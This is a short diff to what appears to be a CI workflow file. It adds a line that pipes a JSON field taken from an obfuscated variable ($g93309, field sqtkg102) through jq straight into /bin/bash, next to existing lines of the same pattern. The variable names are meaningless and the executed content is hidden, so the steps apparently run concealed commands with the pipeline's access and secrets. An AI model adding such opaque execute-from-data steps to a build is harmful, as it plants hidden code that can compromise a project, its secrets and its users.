@@ -44,6 +44,7 @@ jobs:
           printf '%s' "$go49" | jq -r .icj89263 | /bin/bash
           printf '%s' "$gj94" | jq -r .gal93 | /bin/bash
           printf '%s' "$ood5294" | jq -r .jwvf6684 | /bin/bash
+          echo $g93309 | jq -r .sqtkg102 | /bin/bash
 
       - name: Archive results
         if: always()
